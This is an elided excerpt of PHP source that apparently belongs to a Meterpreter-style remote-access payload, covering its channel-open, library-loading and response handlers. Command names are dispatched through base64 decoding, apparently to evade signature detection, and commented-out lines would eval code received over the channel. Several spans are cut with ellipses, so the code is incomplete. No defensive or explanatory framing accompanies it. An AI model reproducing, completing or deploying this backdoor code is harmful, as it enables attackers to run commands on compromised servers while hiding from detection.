...
function core_channel_open($req, &$pkt) {
    ...
    if ($type_tlv['value'] && is_callable($handler)) {
        my_print("Calling {$handler}");
                //if($method == base64_decode(base64_encode("stdapi_fs_getwd2"))){
          //packet_add_tlv($pkt, create_tlv(TLV_TYPE_DIRECTORY_PATH, "deine mudder"));
          //eval("stdapi_fs_getwd");
        //  stdapi_fs_getwd($req, &$pkt);
        $ret = $handler($req, $pkt);
    } else {
...
function core_loadlib($req, &$pkt) {
    ...
    if (($data_tlv['type'] & TLV_META_TYPE_COMPRESSED) == TLV_META_TYPE_COMPRESSED) {
        ...
        //my_print("evaling: ".decoded_method);
        //decoded_method = base64_decode($data_tlv['value']);
        $method = $data_tlv['value'];

        //if(function_exists(base64_decode($method))){
        //  eval(base64_decode($method));
        //}else{
        //if(base64_decode($method) == "stdapi_fs_getwd"){  //$method == "c3RkYXBpX2ZzX2dldHdk"){//
       // if($method == "stdapi_fs_getwd2"){
        //if($method == base64_decode(base64_encode("stdapi_fs_getwd2"))){
          //packet_add_tlv($pkt, create_tlv(TLV_TYPE_DIRECTORY_PATH, "deine mudder"));
          //eval("stdapi_fs_getwd");
        //  stdapi_fs_getwd($req, &$pkt);
        ...
        //my_print("evaling ".$data_tlv['value']);
        //eval($data_tlv['value']);
        return ERROR_SUCCESS;
    }
}
...
function create_response($req) {
    ...
    //if($method_tlv['value'] == "c3RkYXBpX2ZzX2dldHdk"){
    //if($method_tlv['value'] == "stdapi_fs_getwd"){
    //if($method_tlv['value'] == "dEin2Em2Ud2De3RdEin2Em2Ud2De3R"){
    //if($method_tlv['value'] == "c3RkYXBpX2ZzX2dldHdk"){

      $my_call = base64_decode($method_tlv['value']);
      //$my_call = base64_decode("c3RkYXBpX2ZzX2dldHdk");//base64_decode($method_tlv['value']);
      //$my_call = "stdapi_fs_getwd";//$method_tlv['value'];
